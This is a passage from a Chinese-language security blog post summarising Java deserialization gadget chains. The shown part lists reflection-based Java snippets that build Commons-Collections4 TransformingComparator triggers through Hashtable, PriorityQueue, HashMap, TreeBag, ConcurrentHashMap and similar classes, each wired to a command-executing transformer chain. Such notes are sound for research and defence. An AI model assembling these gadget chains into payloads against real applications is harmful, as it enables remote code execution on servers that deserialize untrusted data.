+<h2 id="TransformingComparator-compare-Commons-Collections4"><a href="#TransformingComparator-compare-Commons-Collections4" class="headerlink" title="TransformingComparator.compare(){Commons-Collections4}"></a>TransformingComparator.compare(){Commons-Collections4}</h2><h3 id="Hashtable-compare"><a href="#Hashtable-compare" class="headerlink" title="Hashtable-&gt;compare"></a>Hashtable-&gt;compare</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">TreeMap&lt;Object,Object&gt; m1 = new TreeMap&lt;&gt;(transformingComparator);</span><br><span class="line">setFieldValue(m1, &quot;size&quot;, 1);</span><br><span class="line">setFieldValue(m1, &quot;modCount&quot;, 1);</span><br><span class="line">Class&lt;?&gt; nodeC = Class.forName(&quot;java.util.TreeMap$Entry&quot;);</span><br><span class="line">Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);</span><br><span class="line">nodeCons.setAccessible(true);</span><br><span class="line">Object node = nodeCons.newInstance(transformingComparator, 1, null);</span><br><span class="line">setFieldValue(m1, &quot;root&quot;, node);</span><br><span class="line"></span><br><span class="line">TreeMap&lt;Object,Object&gt; m2 = new TreeMap&lt;&gt;(transformingComparator);</span><br><span class="line">setFieldValue(m2, &quot;size&quot;, 1);</span><br><span class="line">setFieldValue(m2, &quot;modCount&quot;, 1);</span><br><span class="line">setFieldValue(m2, &quot;root&quot;, node);</span><br><span class="line">Hashtable hashtable = new Hashtable();</span><br><span class="line">setFieldValue(hashtable,&quot;count&quot;,2);</span><br><span class="line">Class&lt;?&gt; nodeD;</span><br><span class="line">nodeD = Class.forName(&quot;java.util.Hashtable$Entry&quot;);</span><br><span class="line"></span><br><span class="line">Constructor&lt;?&gt; nodeDons = nodeD.getDeclaredConstructor(int.class, Object.class, Object.class, nodeD);</span><br><span class="line">nodeDons.setAccessible(true);</span><br><span class="line">Object tbl = Array.newInstance(nodeD, 2);</span><br><span class="line">Array.set(tbl, 0, nodeDons.newInstance(0, m1, &quot;Unam4&quot;, null));</span><br><span class="line">Array.set(tbl, 1, nodeDons.newInstance(0, m2, &quot;Springkill&quot;, null));</span><br><span class="line">setFieldValue(hashtable, &quot;table&quot;, tbl);</span><br></pre></td></tr></table></figure>
+
+<h3 id="PriorityQueue-compare"><a href="#PriorityQueue-compare" class="headerlink" title="PriorityQueue-&gt;compare"></a>PriorityQueue-&gt;compare</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue queue = new PriorityQueue(1);</span><br><span class="line">setFieldValue(queue, &quot;size&quot;, 2);</span><br><span class="line">setFieldValue(queue, &quot;comparator&quot;, transformingComparator);</span><br><span class="line">setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;transformingComparator,1&#125;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="AnnotationInvocationHandler-compare"><a href="#AnnotationInvocationHandler-compare" class="headerlink" title="AnnotationInvocationHandler -&gt;compare"></a>AnnotationInvocationHandler -&gt;compare</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));</span><br><span class="line"></span><br><span class="line">Map treeMap = new TreeMap(transformingComparator);</span><br><span class="line">treeMap.put(&quot;key&quot;,&quot;value&quot;);</span><br><span class="line"></span><br><span class="line">setFieldValue(transformingComparator,&quot;transformer&quot;,chainedTransformer);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor&lt;?&gt; Anotationdeclared =</span><br><span class="line">        AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">Anotationdeclared.setAccessible(true);</span><br><span class="line">InvocationHandler h = (InvocationHandler) Anotationdeclared.newInstance(Override.class, treeMap);</span><br><span class="line">Map Mapproxy =(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(),new Class[]&#123;Map.class&#125;, h);</span><br><span class="line">Object o1 =Anotationdeclared.newInstance(Override.class, Mapproxy);</span><br></pre></td></tr></table></figure>
+
+<h3 id="hashmap-compare"><a href="#hashmap-compare" class="headerlink" title="hashmap-&gt;compare"></a>hashmap-&gt;compare</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));</span><br><span class="line"></span><br><span class="line">TreeMap treeMap1 = new TreeMap(transformingComparator);</span><br><span class="line">treeMap1.put(&quot;1&quot;, 1);</span><br><span class="line">TreeMap treeMap2 = new TreeMap(transformingComparator);</span><br><span class="line">treeMap2.put(&quot;1&quot;,1);</span><br><span class="line">setFieldValue(transformingComparator,&quot;transformer&quot;,chainedTransformer);</span><br><span class="line">HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;();</span><br><span class="line">setFieldValue(s, &quot;size&quot;, 2);</span><br><span class="line">Class&lt;?&gt; nodeC;</span><br><span class="line">try &#123;</span><br><span class="line">    nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);</span><br><span class="line">&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">    nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);</span><br><span class="line">&#125;</span><br><span class="line">Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);</span><br><span class="line">nodeCons.setAccessible(true);</span><br><span class="line">Object tbl = Array.newInstance(nodeC, 2);</span><br><span class="line">Array.set(tbl, 0, nodeCons.newInstance(0, treeMap1, &quot;key1&quot;, null));</span><br><span class="line">Array.set(tbl, 1, nodeCons.newInstance(0, treeMap2, &quot;key2&quot;, null));</span><br><span class="line">setFieldValue(s, &quot;table&quot;, tbl);</span><br></pre></td></tr></table></figure>
+
+<h3 id="treebag—-compare"><a href="#treebag—-compare" class="headerlink" title="treebag—&gt;compare"></a>treebag—&gt;compare</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));</span><br><span class="line"></span><br><span class="line">TreeBag treeBag = new TreeBag(transformingComparator);</span><br><span class="line">treeBag.add(1);</span><br><span class="line">setFieldValue(transformingComparator,&quot;transformer&quot;,chainedTransformer);</span><br></pre></td></tr></table></figure>
+
+<h3 id="ConcurrentHashMap-compare"><a href="#ConcurrentHashMap-compare" class="headerlink" title="ConcurrentHashMap-&gt;compare"></a>ConcurrentHashMap-&gt;compare</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));</span><br><span class="line"></span><br><span class="line">TreeMap treeMap1 = new TreeMap(transformingComparator);</span><br><span class="line">treeMap1.put(transformingComparator, 1);</span><br><span class="line">TreeMap treeMap2 = new TreeMap(transformingComparator);</span><br><span class="line">treeMap2.put(transformingComparator,1);</span><br><span class="line">setFieldValue(transformingComparator,&quot;transformer&quot;,chainedTransformer);</span><br><span class="line">ConcurrentHashMap&lt;Object, Object&gt; s = new ConcurrentHashMap&lt;&gt;();</span><br><span class="line">setFieldValue(s, &quot;sizeCtl&quot;, 2);</span><br><span class="line">Class&lt;?&gt; nodeC;</span><br><span class="line">try &#123;</span><br><span class="line">    nodeC = Class.forName(&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;);</span><br><span class="line">&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">    nodeC = Class.forName(&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;);</span><br><span class="line">&#125;</span><br><span class="line">Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);</span><br><span class="line">nodeCons.setAccessible(true);</span><br><span class="line">Object tbl = Array.newInstance(nodeC, 2);</span><br><span class="line">Array.set(tbl, 0, nodeCons.newInstance(0, treeMap1, &quot;unam4&quot;, null));</span><br><span class="line">Array.set(tbl, 1, nodeCons.newInstance(0, treeMap2, &quot;springkill&quot;, null));</span><br><span class="line">setFieldValue(s, &quot;table&quot;, tbl);</span><br></pre></td></tr></table></figure>
+
+<h3 id="DualTreeBidiMapr-compare"><a href="#DualTreeBidiMapr-compare" class="headerlink" title="DualTreeBidiMapr-&gt;compare"></a>DualTreeBidiMapr-&gt;compare</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TransformingComparator comparator = new TransformingComparator(new ConstantTransformer(1));</span><br><span class="line">DualTreeBidiMap dualTreeBidiMap = new DualTreeBidiMap(comparator, comparator);</span><br><span class="line">dualTreeBidiMap.put(&quot;demo&quot;, &quot;demo&quot;);</span><br><span class="line"></span><br><span class="line">setFieldValue(comparator,&quot;transformer&quot;, chainedTransformer);</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a class="link" target="_blank" rel="noopener" href="https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/#map-get-%E8%A7%A6%E5%8F%91InstantiateTransformer">https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/#map-get-%E8%A7%A6%E5%8F%91InstantiateTransformer<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14431#/">https://xz.aliyun.com/news/14431#/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://forum.butian.net/share/1233#/">https://forum.butian.net/share/1233#/<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                java反序列化小结(1)
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/06/06/反序列化小结(1)/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    Author
+                </div>
+                <div class="content">follycat</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    Published
+                </div>
+                <div class="content">2025-06-06 22:50</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    License
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="Copy copyright info" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/05/30/WMCTF2023-ez_java_again(RMIConnector%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/"
+                                   title="WMCTF2023-ez_java_again(RMIConnector二次反序列化)"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">WMCTF2023-ez_java_again(RMIConnector二次反序列化)</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;Comments
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">Comment plugin failed to load</span>
+    <button class="reload keep-button">Click to reload</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">Loading comment plugin</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="configuration-items-error-tip border-box">
+    <i class="fa-solid fa-circle-exclamation"></i>
+    Please fill in the required configuration items for Valine comment plugin
+</div>
+
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86"><span class="nav-text">命令执行部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ChainedTransformer%E8%B0%83%E7%94%A8Runtime"><span class="nav-text">ChainedTransformer调用Runtime</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8-%E8%A7%A6%E5%8F%91"><span class="nav-text">调用&amp;触发</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LazyMap-DefaultedMap-get"><span class="nav-text">[LazyMap&#x2F;DefaultedMap].get()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TransformedMap-setValue"><span class="nav-text">TransformedMap.setValue()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TransformingComparator-compare"><span class="nav-text">TransformingComparator.compare()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ClosureTransformer%E8%B0%83%E7%94%A8Runtime-%E6%97%A0%E9%9C%80%E6%95%B0%E7%BB%84"><span class="nav-text">ClosureTransformer调用Runtime(无需数组)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8-%E8%A7%A6%E5%8F%91-1"><span class="nav-text">调用&amp;触发</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TemplateImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">TemplateImpl加载字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-2"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8-%E8%A7%A6%E5%8F%91-2"><span class="nav-text">调用&amp;触发</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#InvokerTransformer%E8%B0%83%E7%94%A8newTransformer"><span class="nav-text">InvokerTransformer调用newTransformer()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TrAXFilter-TrAXFilter%E8%B0%83%E7%94%A8newTransformer"><span class="nav-text">TrAXFilter#TrAXFilter调用newTransformer()</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#InstantiateTransformer"><span class="nav-text">InstantiateTransformer</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#FactoryTransformer"><span class="nav-text">FactoryTransformer</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%83%A8%E5%88%86"><span class="nav-text">调用部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LazyMap-DefaultedMap-get-1"><span class="nav-text">[LazyMap&#x2F;DefaultedMap].get()</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EventListenerList-toString"><span class="nav-text">EventListenerList-&gt;toString</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HotSwappableTargetSource-XString-tostring"><span class="nav-text">HotSwappableTargetSource &amp; XString-&gt;tostring</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CaseInsensitiveMap-tostring"><span class="nav-text">CaseInsensitiveMap-&gt;tostring</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashtable-tostring"><span class="nav-text">hashtable-&gt;tostring</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BadAttributeValueExpException-tostring"><span class="nav-text">BadAttributeValueExpException-&gt;tostring</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AnnotationInvocationHandler-tostring-jdk"><span class="nav-text">AnnotationInvocationHandler-&gt;tostring (jdk&lt;8u20)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashmap-tostring-jdk8u181"><span class="nav-text">hashmap-&gt;tostring(jdk8u181)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HotSwappableTargetSource-equals"><span class="nav-text">HotSwappableTargetSource-&gt;equals</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hashtable-equals"><span class="nav-text">Hashtable-&gt;equals</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HashMap-equals"><span class="nav-text">HashMap-&gt;equals</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ConcurrentHashMap-equals"><span class="nav-text">ConcurrentHashMap-&gt;equals</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flat3Map-hashcode"><span class="nav-text">flat3Map-&gt;hashcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashed-hashcode"><span class="nav-text">hashed-&gt;hashcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dualHashBidiMap-hashcode"><span class="nav-text">dualHashBidiMap-&gt;hashcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#css-hashcode"><span class="nav-text">css-&gt;hashcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DualLinkedHashBidiMap-hashcode"><span class="nav-text">DualLinkedHashBidiMap-&gt;hashcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AnnotationInvocationHandle-map-get"><span class="nav-text">AnnotationInvocationHandle-&gt;map.get</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TransformedMap-setValue-1"><span class="nav-text">TransformedMap.setValue()</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AnnotationInvocationHandler%E8%A7%A6%E5%8F%91TransformedMap-CC1"><span class="nav-text">AnnotationInvocationHandler触发TransformedMap(CC1)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TransformingComparator-compare-Commons-Collections4"><span class="nav-text">TransformingComparator.compare(){Commons-Collections4}</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hashtable-compare"><span class="nav-text">Hashtable-&gt;compare</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PriorityQueue-compare"><span class="nav-text">PriorityQueue-&gt;compare</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AnnotationInvocationHandler-compare"><span class="nav-text">AnnotationInvocationHandler -&gt;compare</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashmap-compare"><span class="nav-text">hashmap-&gt;compare</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#treebag%E2%80%94-compare"><span class="nav-text">treebag—&gt;compare</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ConcurrentHashMap-compare"><span class="nav-text">ConcurrentHashMap-&gt;compare</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DualTreeBidiMapr-compare"><span class="nav-text">DualTreeBidiMapr-&gt;compare</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-text">参考文章</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">follycat</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">Unique Visitor</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86"><span class="nav-text">命令执行部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ChainedTransformer%E8%B0%83%E7%94%A8Runtime"><span class="nav-text">ChainedTransformer调用Runtime</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8-%E8%A7%A6%E5%8F%91"><span class="nav-text">调用&amp;触发</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LazyMap-DefaultedMap-get"><span class="nav-text">[LazyMap&#x2F;DefaultedMap].get()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TransformedMap-setValue"><span class="nav-text">TransformedMap.setValue()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TransformingComparator-compare"><span class="nav-text">TransformingComparator.compare()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" 